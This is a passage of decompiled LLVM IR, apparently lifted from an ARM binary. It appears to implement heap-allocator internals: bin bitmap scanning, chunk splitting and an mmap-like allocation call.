  store i32 %v0_11328, i32* %r0.global-to-local, align 4
  %v0_1132c.pre = load i32, i32* @sl, align 4
  %v1_1132c.pre = load i32, i32* @r2, align 4
  %v0_11334.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1132c

dec_label_pc_1132c:                               ; preds = %dec_label_pc_1131c, %dec_label_pc_11328
  %v1_11334 = phi i32 [ %v3_11304, %dec_label_pc_1131c ], [ %v0_11328, %dec_label_pc_11328 ]
  %v0_11334 = phi i32 [ %v3_1130c, %dec_label_pc_1131c ], [ %v0_11334.pre, %dec_label_pc_11328 ]
  %v1_1132c = phi i32 [ %v1_112fc, %dec_label_pc_1131c ], [ %v1_1132c.pre, %dec_label_pc_11328 ]
  %v0_1132c = phi i32 [ %v0_112e0, %dec_label_pc_1131c ], [ %v0_1132c.pre, %dec_label_pc_11328 ]
  %v2_1132c = sub i32 %v1_1132c, %v0_1132c
  store i32 %v2_1132c, i32* %lr.global-to-local, align 4
  %v2_11334 = add i32 %v1_11334, 8
  %v3_11334 = inttoptr i32 %v2_11334 to i32*
  store i32 %v0_11334, i32* %v3_11334, align 4
  %v0_11338 = load i32, i32* %r0.global-to-local, align 4
  %v1_11338 = load i32, i32* %r1.global-to-local, align 4
  %v2_11338 = add i32 %v1_11338, 12
  %v3_11338 = inttoptr i32 %v2_11338 to i32*
  store i32 %v0_11338, i32* %v3_11338, align 4
  %v0_1133c = load i32, i32* %ip.global-to-local, align 4
  %v1_1133c = add i32 %v0_1133c, 8
  store i32 %v1_1133c, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_1132c, 15
  br i1 %tmp207, label %dec_label_pc_1135c, label %dec_label_pc_11344

dec_label_pc_11344:                               ; preds = %dec_label_pc_1132c
  %v1_11344 = load i32, i32* %r2.global-to-local, align 4
  %v2_11344 = add i32 %v1_11344, %v0_1133c
  store i32 %v2_11344, i32* %r2.global-to-local, align 4
  %v1_11348 = add i32 %v2_11344, 4
  %v2_11348 = inttoptr i32 %v1_11348 to i32*
  %v3_11348 = load i32, i32* %v2_11348, align 4
  store i32 %v3_11348, i32* %r3.global-to-local, align 4
  store i32 %v1_1133c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11350

dec_label_pc_11350.loopexit:                      ; preds = %dec_label_pc_111f0
  %v1_111fc = load i32, i32* @r6, align 4
  %v2_111fc = load i32, i32* @sl, align 4
  %v3_111fc = add i32 %v2_111fc, %v1_111fc
  store i32 %v3_111fc, i32* %r2.global-to-local, align 4
  %v2_11200 = add i32 %v3_111fc, 4
  %v3_11200 = inttoptr i32 %v2_11200 to i32*
  %v4_11200 = load i32, i32* %v3_11200, align 4
  store i32 %v4_11200, i32* %r3.global-to-local, align 4
  %v2_11204 = add i32 %v1_111fc, 8
  store i32 %v2_11204, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11350

dec_label_pc_11350:                               ; preds = %.dec_label_pc_11350_crit_edge, %dec_label_pc_11350.loopexit, %dec_label_pc_11344
  %v1_11354 = phi i32 [ %v4_11478, %.dec_label_pc_11350_crit_edge ], [ %v3_111fc, %dec_label_pc_11350.loopexit ], [ %v2_11344, %dec_label_pc_11344 ]
  %v0_11350 = phi i32 [ %v7_11478, %.dec_label_pc_11350_crit_edge ], [ %v4_11200, %dec_label_pc_11350.loopexit ], [ %v3_11348, %dec_label_pc_11344 ]
  %v1_11350 = or i32 %v0_11350, 1
  store i32 %v1_11350, i32* %r3.global-to-local, align 4
  %v2_11354 = add i32 %v1_11354, 4
  %v3_11354 = inttoptr i32 %v2_11354 to i32*
  store i32 %v1_11350, i32* %v3_11354, align 4
  br label %dec_label_pc_11910

dec_label_pc_1135c:                               ; preds = %dec_label_pc_1132c
  %v1_1135c = load i32, i32* @sl, align 4
  %v2_1135c = add i32 %v1_1135c, %v0_1133c
  store i32 %v2_1135c, i32* %r2.global-to-local, align 4
  %v1_11360 = or i32 %v1_1135c, 1
  store i32 %v1_11360, i32* %r3.global-to-local, align 4
  %v0_11364 = load i32, i32* %lr.global-to-local, align 4
  %v1_11364 = or i32 %v0_11364, 1
  store i32 %v1_11364, i32* %r1.global-to-local, align 4
  store i32 %v1_1133c, i32* %r4.global-to-local, align 4
  %v2_1136c = add i32 %v0_1133c, 4
  %v3_1136c = inttoptr i32 %v2_1136c to i32*
  store i32 %v1_11360, i32* %v3_1136c, align 4
  %v0_11370 = load i32, i32* %r2.global-to-local, align 4
  %v1_11370 = load i32, i32* @r6, align 4
  %v2_11370 = add i32 %v1_11370, 8
  %v3_11370 = inttoptr i32 %v2_11370 to i32*
  store i32 %v0_11370, i32* %v3_11370, align 4
  %v0_11374 = load i32, i32* %r2.global-to-local, align 4
  %v1_11374 = load i32, i32* @r6, align 4
  %v2_11374 = add i32 %v1_11374, 12
  %v3_11374 = inttoptr i32 %v2_11374 to i32*
  store i32 %v0_11374, i32* %v3_11374, align 4
  %v0_11378 = load i32, i32* %lr.global-to-local, align 4
  %v1_11378 = load i32, i32* %r2.global-to-local, align 4
  %v3_11378 = add i32 %v1_11378, %v0_11378
  %v4_11378 = inttoptr i32 %v3_11378 to i32*
  store i32 %v0_11378, i32* %v4_11378, align 4
  %v0_1137c = load i32, i32* %r1.global-to-local, align 4
  %v1_1137c = load i32, i32* %r2.global-to-local, align 4
  %v2_1137c = add i32 %v1_1137c, 4
  %v3_1137c = inttoptr i32 %v2_1137c to i32*
  store i32 %v0_1137c, i32* %v3_1137c, align 4
  %v0_11380 = load i32, i32* @r6, align 4
  %v1_11380 = load i32, i32* %r2.global-to-local, align 4
  %v2_11380 = add i32 %v1_11380, 12
  %v3_11380 = inttoptr i32 %v2_11380 to i32*
  store i32 %v0_11380, i32* %v3_11380, align 4
  %v0_11384 = load i32, i32* @r6, align 4
  %v1_11384 = load i32, i32* %r2.global-to-local, align 4
  %v2_11384 = add i32 %v1_11384, 8
  %v3_11384 = inttoptr i32 %v2_11384 to i32*
  store i32 %v0_11384, i32* %v3_11384, align 4
  br label %dec_label_pc_11910

dec_label_pc_11390:                               ; preds = %dec_label_pc_112f8, %dec_label_pc_112e8
  %v1_11320 = phi i32 [ %storemerge.pre, %dec_label_pc_112e8 ], [ %v3_11304, %dec_label_pc_112f8 ]
  store i32 %v1_11320, i32* %ip.global-to-local, align 4
  %v9_11390 = icmp eq i32 %v1_11320, %v1_112ec
  br i1 %v9_11390, label %dec_label_pc_11398.loopexit, label %dec_label_pc_112f8

dec_label_pc_11398.loopexit:                      ; preds = %dec_label_pc_11390
  br label %dec_label_pc_11398

dec_label_pc_11398:                               ; preds = %dec_label_pc_112e0.dec_label_pc_11398_crit_edge, %dec_label_pc_11398.loopexit
  %v4_113c8.pre-phi = phi i32 [ %.pre200, %dec_label_pc_112e0.dec_label_pc_11398_crit_edge ], [ %v4_112e8, %dec_label_pc_11398.loopexit ]
  %v1_11398 = add i32 %v0_11398.pre, 1
  store i32 %v1_11398, i32* %r2.global-to-local, align 4
  %v1_1139c = urem i32 %v1_11398, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 123764, i32* %r0.global-to-local, align 4
  %v6_113a8 = shl i32 1, %v1_1139c
  store i32 %v6_113a8, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_113b0 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_113b0, i32* %r3.global-to-local, align 4
  %v3_113b4 = udiv i32 %v1_11398, 32
  store i32 %v3_113b4, i32* @r5, align 4
  %v4_113b8 = mul nuw nsw i32 %v3_113b4, 4
  %v5_113b8 = add i32 %v4_113b0, %v4_113b8
  store i32 %v5_113b8, i32* %r2.global-to-local, align 4
  %v1_113bc = add i32 %v5_113b8, 820
  %v2_113bc = inttoptr i32 %v1_113bc to i32*
  %v3_113bc = load i32, i32* %v2_113bc, align 4
  store i32 %v3_113bc, i32* @r4, align 4
  %v1_113c0 = add i32 %v4_113b0, 52
  store i32 %v1_113c0, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_113c8 = add i32 %v1_113c0, %v4_113c8.pre-phi
  store i32 %v5_113c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_113cc

dec_label_pc_113cc:                               ; preds = %dec_label_pc_11434, %dec_label_pc_11398
  %v1_113d4 = phi i32 [ %v1_113d4.pre, %dec_label_pc_11434 ], [ %v3_113bc, %dec_label_pc_11398 ]
  %v0_113d4 = phi i32 [ %v0_113cc.pre, %dec_label_pc_11434 ], [ %v6_113a8, %dec_label_pc_11398 ]
  %v1_113cc = sub i32 1, %v0_113d4
  %v2_113cc = icmp ult i32 %v0_113d4, 2
  %v1_113cc. = select i1 %v2_113cc, i32 %v1_113cc, i32 0
  store i32 %v1_113cc., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_113d4, %v1_113d4
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_113cc
  %v5_113d8 = or i32 %v1_113cc., 1
  store i32 %v5_113d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_113e4.preheader

bb142:                                            ; preds = %dec_label_pc_113cc
  %v2_113dc = icmp eq i32 %v1_113cc., 0
  br i1 %v2_113dc, label %.dec_label_pc_11420.preheader_crit_edge, label %dec_label_pc_113e4.preheader

.dec_label_pc_11420.preheader_crit_edge:          ; preds = %bb142
  %v0_1141854.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11420.preheader

dec_label_pc_113e4.preheader:                     ; preds = %bb142, %.thread12
  %v0_113e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_113e4

dec_label_pc_113e4:                               ; preds = %dec_label_pc_113e4.preheader, %dec_label_pc_113f0
  %v0_113e4 = phi i32 [ %v0_113e4.pre, %dec_label_pc_113e4.preheader ], [ %v1_113e4, %dec_label_pc_113f0 ]
  %v1_113e4 = add i32 %v0_113e4, 1
  store i32 %v1_113e4, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_113e4, 2
  br i1 %tmp208, label %dec_label_pc_114c4.loopexit, label %dec_label_pc_113f0

dec_label_pc_113f0:                               ; preds = %dec_label_pc_113e4
  store i32 123764, i32* %r3.global-to-local, align 4
  %v1_113f4 = load i32, i32* @r8, align 4
  %v2_113f4 = add i32 %v1_113f4, 123764
  %v3_113f4 = inttoptr i32 %v2_113f4 to i32*
  %v4_113f4 = load i32, i32* %v3_113f4, align 4
  store i32 %v4_113f4, i32* %r2.global-to-local, align 4
  %v4_113f8 = mul i32 %v1_113e4, 4
  %v5_113f8 = add i32 %v4_113f4, %v4_113f8
  store i32 %v5_113f8, i32* %r3.global-to-local, align 4
  %v1_113fc = add i32 %v5_113f8, 820
  %v2_113fc = inttoptr i32 %v1_113fc to i32*
  %v3_113fc = load i32, i32* %v2_113fc, align 4
  store i32 %v3_113fc, i32* @r4, align 4
  %v2_11400 = icmp eq i32 %v3_113fc, 0
  br i1 %v2_11400, label %dec_label_pc_113e4, label %dec_label_pc_11408

dec_label_pc_11408:                               ; preds = %dec_label_pc_113f0
  %v4_11408 = mul i32 %v1_113e4, 256
  %v5_11408 = add i32 %v4_113f4, %v4_11408
  store i32 %v5_11408, i32* %r3.global-to-local, align 4
  %v1_1140c = add i32 %v5_11408, 44
  store i32 %v1_1140c, i32* %r0.global-to-local, align 4
  %v0_11410 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11410, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11420.preheader

dec_label_pc_11420.preheader:                     ; preds = %.dec_label_pc_11420.preheader_crit_edge, %dec_label_pc_11408
  %v0_1141854 = phi i32 [ %v1_1140c, %dec_label_pc_11408 ], [ %v0_1141854.pre, %.dec_label_pc_11420.preheader_crit_edge ]
  %v0_1143c = phi i32 [ %v3_113fc, %dec_label_pc_11408 ], [ %v1_113d4, %.dec_label_pc_11420.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_11410, %dec_label_pc_11408 ], [ %v0_113d4, %.dec_label_pc_11420.preheader_crit_edge ]
  %v2_1142051 = and i32 %ip.promoted, %v0_1143c
  %v4_1142053 = icmp eq i32 %v2_1142051, 0
  br i1 %v4_1142053, label %dec_label_pc_11418, label %dec_label_pc_11428

dec_label_pc_11418:                               ; preds = %dec_label_pc_11420.preheader, %dec_label_pc_11418
  %v2_1141c56 = phi i32 [ %v2_1141c, %dec_label_pc_11418 ], [ %ip.promoted, %dec_label_pc_11420.preheader ]
  %v0_1141855 = phi i32 [ %v1_11418, %dec_label_pc_11418 ], [ %v0_1141854, %dec_label_pc_11420.preheader ]
  %v1_11418 = add i32 %v0_1141855, 8
  %v2_1141c = mul i32 %v2_1141c56, 2
  %v2_11420 = and i32 %v2_1141c, %v0_1143c
  %v4_11420 = icmp eq i32 %v2_11420, 0
  br i1 %v4_11420, label %dec_label_pc_11418, label %dec_label_pc_11420.dec_label_pc_11428_crit_edge

dec_label_pc_11420.dec_label_pc_11428_crit_edge:  ; preds = %dec_label_pc_11418
  store i32 %v1_11418, i32* %r0.global-to-local, align 4
  store i32 %v2_1141c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11428

dec_label_pc_11428:                               ; preds = %dec_label_pc_11420.dec_label_pc_11428_crit_edge, %dec_label_pc_11420.preheader
  %v0_11448 = phi i32 [ %v2_1141c, %dec_label_pc_11420.dec_label_pc_11428_crit_edge ], [ %ip.promoted, %dec_label_pc_11420.preheader ]
  %v0_1146c = phi i32 [ %v1_11418, %dec_label_pc_11420.dec_label_pc_11428_crit_edge ], [ %v0_1141854, %dec_label_pc_11420.preheader ]
  %v1_11428 = add i32 %v0_1146c, 12
  %v2_11428 = inttoptr i32 %v1_11428 to i32*
  %v3_11428 = load i32, i32* %v2_11428, align 4
  store i32 %v3_11428, i32* @lr, align 4
  %v9_1142c = icmp eq i32 %v3_11428, %v0_1146c
  br i1 %v9_1142c, label %dec_label_pc_11434, label %dec_label_pc_11454

dec_label_pc_11434:                               ; preds = %dec_label_pc_11428
  store i32 123764, i32* %r0.global-to-local, align 4
  %v1_11438 = load i32, i32* @r8, align 4
  %v2_11438 = add i32 %v1_11438, 123764
  %v3_11438 = inttoptr i32 %v2_11438 to i32*
  %v4_11438 = load i32, i32* %v3_11438, align 4
  %v2_1143c = sub i32 -1, %v0_11448
  %v3_1143c = and i32 %v0_1143c, %v2_1143c
  store i32 %v3_1143c, i32* @r4, align 4
  %v1_11440 = load i32, i32* @r5, align 4
  %v4_11440 = mul i32 %v1_11440, 4
  %v5_11440 = add i32 %v4_11440, %v4_11438
  store i32 %v5_11440, i32* %r3.global-to-local, align 4
  %v1_11444 = add i32 %v0_1146c, 8
  store i32 %v1_11444, i32* %r0.global-to-local, align 4
  %v2_11448 = mul i32 %v0_11448, 2
  store i32 %v2_11448, i32* %ip.global-to-local, align 4
  %v2_1144c = add i32 %v5_11440, 820
  %v3_1144c = inttoptr i32 %v2_1144c to i32*
  store i32 %v3_1143c, i32* %v3_1144c, align 4
  %v0_113cc.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_113d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_113cc

dec_label_pc_11454:                               ; preds = %dec_label_pc_11428
  %v1_11454 = add i32 %v3_11428, 4
  %v2_11454 = inttoptr i32 %v1_11454 to i32*
  %v3_11454 = load i32, i32* %v2_11454, align 4
  store i32 %v3_11454, i32* %r3.global-to-local, align 4
  %v1_11458 = and i32 %v3_11454, -4
  store i32 %v1_11458, i32* %r2.global-to-local, align 4
  %v0_1145c = load i32, i32* @sl, align 4
  %v2_1145c = sub i32 %v1_11458, %v0_1145c
  store i32 %v2_1145c, i32* %ip.global-to-local, align 4
  %v1_11460 = add i32 %v3_11428, 12
  %v2_11460 = inttoptr i32 %v1_11460 to i32*
  %v3_11460 = load i32, i32* %v2_11460, align 4
  store i32 %v3_11460, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_1145c, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_11454
  %v6_11468 = add i32 %v1_11458, %v3_11428
  store i32 %v6_11468, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_11454, %bb143
  %v2_1146c = add i32 %v3_11460, 8
  %v3_1146c = inttoptr i32 %v2_1146c to i32*
  store i32 %v0_1146c, i32* %v3_1146c, align 4
  %v0_11470 = load i32, i32* %r3.global-to-local, align 4
  %v1_11470 = load i32, i32* %r0.global-to-local, align 4
  %v2_11470 = add i32 %v1_11470, 12
  %v3_11470 = inttoptr i32 %v2_11470 to i32*
  store i32 %v0_11470, i32* %v3_11470, align 4
  %v4_11474 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_11350_crit_edge, label %dec_label_pc_11480

.dec_label_pc_11350_crit_edge:                    ; preds = %bb144
  %v5_11474 = add i32 %v4_11474, 8
  store i32 %v5_11474, i32* %r4.global-to-local, align 4
  %v4_11478 = load i32, i32* %r2.global-to-local, align 4
  %v5_11478 = add i32 %v4_11478, 4
  %v6_11478 = inttoptr i32 %v5_11478 to i32*
  %v7_11478 = load i32, i32* %v6_11478, align 4
  store i32 %v7_11478, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11350

dec_label_pc_11480:                               ; preds = %bb144
  %v1_11480 = load i32, i32* @sl, align 4
  %v2_11480 = add i32 %v1_11480, %v4_11474
  store i32 %v2_11480, i32* %r1.global-to-local, align 4
  %v1_11488 = load i32, i32* @r6, align 4
  %v2_11488 = add i32 %v1_11488, 8
  %v3_11488 = inttoptr i32 %v2_11488 to i32*
  store i32 %v2_11480, i32* %v3_11488, align 4
  %v0_1148c = load i32, i32* %r1.global-to-local, align 4
  %v1_1148c = load i32, i32* @r6, align 4
  %v2_1148c = add i32 %v1_1148c, 12
  %v3_1148c = inttoptr i32 %v2_1148c to i32*
  store i32 %v0_1148c, i32* %v3_1148c, align 4
  %v0_11490 = load i32, i32* @r6, align 4
  %v1_11490 = load i32, i32* %r1.global-to-local, align 4
  %v2_11490 = add i32 %v1_11490, 8
  %v3_11490 = inttoptr i32 %v2_11490 to i32*
  store i32 %v0_11490, i32* %v3_11490, align 4
  %v0_11494 = load i32, i32* @r6, align 4
  %v1_11494 = load i32, i32* %r1.global-to-local, align 4
  %v2_11494 = add i32 %v1_11494, 12
  %v3_11494 = inttoptr i32 %v2_11494 to i32*
  store i32 %v0_11494, i32* %v3_11494, align 4
  %tmp210 = icmp ult i32 %v1_11480, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_11480
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r2.global-to-local, align 4
  %v8_114a0 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v8_114a0, i32* %r3.global-to-local, align 4
  %v4_114a4 = load i32, i32* %r1.global-to-local, align 4
  %v6_114a4 = add i32 %v8_114a0, 48
  %v7_114a4 = inttoptr i32 %v6_114a4 to i32*
  store i32 %v4_114a4, i32* %v7_114a4, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_11480, %bb145
  %v0_114a8 = load i32, i32* @sl, align 4
  %v1_114a8 = or i32 %v0_114a8, 1
  store i32 %v1_114a8, i32* %r2.global-to-local, align 4
  %v0_114ac = load i32, i32* %ip.global-to-local, align 4
  %v1_114ac = or i32 %v0_114ac, 1
  store i32 %v1_114ac, i32* %r3.global-to-local, align 4
  %v0_114b0 = load i32, i32* @lr, align 4
  %v1_114b0 = add i32 %v0_114b0, 8
  store i32 %v1_114b0, i32* %r4.global-to-local, align 4
  %v2_114b4 = add i32 %v0_114b0, 4
  %v3_114b4 = inttoptr i32 %v2_114b4 to i32*
  store i32 %v1_114a8, i32* %v3_114b4, align 4
  %v0_114b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_114b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_114b8 = add i32 %v1_114b8, %v0_114b8
  %v4_114b8 = inttoptr i32 %v3_114b8 to i32*
  store i32 %v0_114b8, i32* %v4_114b8, align 4
  %v0_114bc = load i32, i32* %r3.global-to-local, align 4
  %v1_114bc = load i32, i32* %r1.global-to-local, align 4
  %v2_114bc = add i32 %v1_114bc, 4
  %v3_114bc = inttoptr i32 %v2_114bc to i32*
  store i32 %v0_114bc, i32* %v3_114bc, align 4
  br label %dec_label_pc_11910

dec_label_pc_114c4.loopexit:                      ; preds = %dec_label_pc_113e4
  br label %dec_label_pc_114c4

dec_label_pc_114c4:                               ; preds = %dec_label_pc_114c4.loopexit, %dec_label_pc_110d8, %dec_label_pc_110e0
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %ip.global-to-local, align 4
  %v4_114cc = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_114cc, i32* @r0, align 4
  %v1_114d0 = add i32 %v4_114cc, 44
  %v2_114d0 = inttoptr i32 %v1_114d0 to i32*
  %v3_114d0 = load i32, i32* %v2_114d0, align 4
  store i32 %v3_114d0, i32* %ip.global-to-local, align 4
  %v1_114d4 = add i32 %v3_114d0, 4
  %v2_114d4 = inttoptr i32 %v1_114d4 to i32*
  %v3_114d4 = load i32, i32* %v2_114d4, align 4
  %v0_114d8 = load i32, i32* @sl, align 4
  %v1_114d8 = add i32 %v0_114d8, 16
  store i32 %v1_114d8, i32* %r1.global-to-local, align 4
  %v1_114dc = and i32 %v3_114d4, -4
  store i32 %v1_114dc, i32* %r3.global-to-local, align 4
  %v3_114e0 = icmp ult i32 %v1_114dc, %v1_114d8
  br i1 %v3_114e0, label %dec_label_pc_11510, label %dec_label_pc_114ec

dec_label_pc_114ec:                               ; preds = %dec_label_pc_114c4
  %v2_114ec = sub i32 %v1_114dc, %v0_114d8
  %v2_114f0 = add i32 %v0_114d8, %v3_114d0
  store i32 %v2_114f0, i32* %r1.global-to-local, align 4
  %v1_114f4 = or i32 %v2_114ec, 1
  store i32 %v1_114f4, i32* %r3.global-to-local, align 4
  %v1_114f8 = or i32 %v0_114d8, 1
  store i32 %v1_114f8, i32* %r2.global-to-local, align 4
  %v1_114fc = add i32 %v3_114d0, 8
  store i32 %v1_114fc, i32* %r4.global-to-local, align 4
  store i32 %v1_114f8, i32* %v2_114d4, align 4
  %v0_11504 = load i32, i32* %r1.global-to-local, align 4
  %v1_11504 = load i32, i32* @r0, align 4
  %v2_11504 = add i32 %v1_11504, 44
  %v3_11504 = inttoptr i32 %v2_11504 to i32*
  store i32 %v0_11504, i32* %v3_11504, align 4
  %v0_11508 = load i32, i32* %r3.global-to-local, align 4
  %v1_11508 = load i32, i32* %r1.global-to-local, align 4
  %v2_11508 = add i32 %v1_11508, 4
  %v3_11508 = inttoptr i32 %v2_11508 to i32*
  store i32 %v0_11508, i32* %v3_11508, align 4
  br label %dec_label_pc_11910

dec_label_pc_11510:                               ; preds = %dec_label_pc_114c4
  %v1_11510 = inttoptr i32 %v4_114cc to i32*
  %v2_11510 = load i32, i32* %v1_11510, align 4
  store i32 %v2_11510, i32* %r3.global-to-local, align 4
  %v1_11514 = and i32 %v2_11510, 2
  store i32 %v1_11514, i32* %ip.global-to-local, align 4
  %v2_11514 = icmp eq i32 %v1_11514, 0
  %v1_11518 = add i32 %v4_114cc, 860
  %v2_11518 = inttoptr i32 %v1_11518 to i32*
  %v3_11518 = load i32, i32* %v2_11518, align 4
  store i32 %v3_11518, i32* %r1.global-to-local, align 4
  br i1 %v2_11514, label %dec_label_pc_11530, label %dec_label_pc_11520

dec_label_pc_11520:                               ; preds = %dec_label_pc_11510
  %v0_11520 = call i32 @function_11ef0()
  %v0_11524 = load i32, i32* @sl, align 4
  %v1_11524 = add i32 %v0_11524, -7
  store i32 %v1_11524, i32* @r0, align 4
  %v0_11528 = call i32 @function_11038()
  store i32 %v0_11528, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1190c

dec_label_pc_11530:                               ; preds = %dec_label_pc_11510
  %v1_11530 = add i32 %v4_114cc, 844
  %v2_11530 = inttoptr i32 %v1_11530 to i32*
  %v3_11530 = load i32, i32* %v2_11530, align 4
  store i32 %v3_11530, i32* %r3.global-to-local, align 4
  %v3_11534 = icmp ult i32 %v0_114d8, %v3_11530
  %v1_11538 = add i32 %v3_11518, -1
  store i32 %v1_11538, i32* %sb.global-to-local, align 4
  br i1 %v3_11534, label %dec_label_pc_1160c, label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_11530
  %v1_11540 = add i32 %v4_114cc, 852
  %v2_11540 = inttoptr i32 %v1_11540 to i32*
  %v3_11540 = load i32, i32* %v2_11540, align 4
  store i32 %v3_11540, i32* %r2.global-to-local, align 4
  %v1_11544 = add i32 %v4_114cc, 848
  %v2_11544 = inttoptr i32 %v1_11544 to i32*
  %v3_11544 = load i32, i32* %v2_11544, align 4
  store i32 %v3_11544, i32* %r3.global-to-local, align 4
  %v6_1154c = icmp slt i32 %v3_11544, %v3_11540
  br i1 %v6_1154c, label %dec_label_pc_11550, label %dec_label_pc_1160c

dec_label_pc_11550:                               ; preds = %dec_label_pc_11540
  %v1_11550 = add i32 %v0_114d8, 10
  %v2_11554 = add i32 %v1_11550, %v3_11518
  store i32 %v2_11554, i32* %r3.global-to-local, align 4
  %v2_11558 = sub i32 0, %v3_11518
  %v3_11558 = and i32 %v2_11554, %v2_11558
  store i32 %v3_11558, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_11558, %v0_114d8
  br i1 %tmp211, label %dec_label_pc_11564, label %dec_label_pc_1160c

dec_label_pc_11564:                               ; preds = %dec_label_pc_11550
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_11558, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1157c = call i32 @function_13320(i32 0, i32 %v3_11558, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1157c, i32* %r0.global-to-local, align 4
  %v7_11580 = icmp eq i32 %v6_1157c, -1
  br i1 %v7_11580, label %dec_label_pc_11564.dec_label_pc_1160c_crit_edge, label %dec_label_pc_11588

dec_label_pc_11564.dec_label_pc_1160c_crit_edge:  ; preds = %dec_label_pc_11564
  %v1_11630.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1160c

dec_label_pc_11588:                               ; preds = %dec_label_pc_11564
  %v1_11588 = urem i32 %v6_1157c, 8
  store i32 %v1_11588, i32* %r2.global-to-local, align 4
  %v2_11588 = icmp eq i32 %v1_11588, 0
  br i1 %v2_11588, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_11588
  %v2_1158c = sub nsw i32 8, %v1_11588
  store i32 %v2_1158c, i32* %r3.global-to-local, align 4
  %v2_11590 = load i32, i32* @r4, align 4
  %v3_11590 = sub i32 %v2_11590, %v2_1158c
  %v3_11594 = add i32 %v2_1158c, %v6_1157c
  store i32 %v3_11594, i32* %lr.global-to-local, align 4
  %v2_1159c = or i32 %v3_11590, 2
  store i32 %v2_1159c, i32* %r2.global-to-local, align 4
  %v5_115a4 = inttoptr i32 %v3_11594 to i32*
  store i32 %v2_1158c, i32* %v5_115a4, align 4
  %v1_115a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_115a8 = load i32, i32* %lr.global-to-local, align 4
  %v3_115a8 = add i32 %v2_115a8, 4
  %v4_115a8 = inttoptr i32 %v3_115a8 to i32*
  store i32 %v1_115a8, i32* %v4_115a8, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_11588
  store i32 %v6_1157c, i32* %lr.global-to-local, align 4
  %v1_115a047 = load i32, i32* @r4, align 4
  %v2_115a048 = or i32 %v1_115a047, 2
  store i32 %v2_115a048, i32* %r3.global-to-local, align 4
  %v3_115ac = inttoptr i32 %v6_1157c to i32*
  store i32 0, i32* %v3_115ac, align 4
  %v1_115b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_115b0 = load i32, i32* %lr.global-to-local, align 4
  %v3_115b0 = add i32 %v2_115b0, 4
  %v4_115b0 = inttoptr i32 %v3_115b0 to i32*
  store i32 %v1_115b0, i32* %v4_115b0, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 123764, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_115bc = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_115bc, i32* %ip.global-to-local, align 4
  %v1_115c0 = add i32 %v4_115bc, 848
  %v2_115c0 = inttoptr i32 %v1_115c0 to i32*
  %v3_115c0 = load i32, i32* %v2_115c0, align 4
  store i32 %v3_115c0, i32* %r3.global-to-local, align 4
  %v1_115c4 = add i32 %v4_115bc, 856
  %v2_115c4 = inttoptr i32 %v1_115c4 to i32*
  %v3_115c4 = load i32, i32* %v2_115c4, align 4
  store i32 %v3_115c4, i32* %r2.global-to-local, align 4
  %v1_115c8 = add i32 %v3_115c0, 1
  store i32 %v1_115c8, i32* %r3.global-to-local, align 4
  %v7_115d0 = icmp sgt i32 %v1_115c8, %v3_115c4
  br i1 %v7_115d0, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_115c8, i32* %v2_115c4, align 4
  %v0_115d4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_115d4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_115d4 = phi i32 [ %v4_115bc, %.thread27 ], [ %v1_115d4.pre, %bb147 ]
  %v0_115d4 = phi i32 [ %v1_115c8, %.thread27 ], [ %v0_115d4.pre, %bb147 ]
  %v2_115d4 = add i32 %v1_115d4, 848
  %v3_115d4 = inttoptr i32 %v2_115d4 to i32*
